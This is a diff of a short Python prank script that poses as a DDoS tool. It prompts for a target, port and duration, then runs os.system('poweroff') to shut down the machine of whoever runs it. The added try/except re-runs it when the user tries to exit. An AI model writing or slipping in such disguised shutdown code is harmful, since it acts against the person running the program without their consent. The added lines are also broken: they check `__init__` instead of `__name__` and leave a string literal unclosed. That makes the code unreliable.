@@ -1,8 +1,15 @@
 import time, os
-print('By using this you agree I am not responsible for anything')
-input('Target: ')
-input('Port: ')
-input('Seconds: ')
-print('LOL stop trying to DDOS')
-time.sleep(2)
-os.system('poweroff')
+def main():
+  print('By using this you agree I am not responsible for anything')
+  input('Target: ')
+  input('Port: ')
+  input('Seconds: ')
+  print('LOL stop trying to DDOS')
+  time.sleep(2)
+  os.system('poweroff')
+try:
+  if __init__ == "__main__":
+    main()
+except:
+  print("do not try to exit!)
+  main()
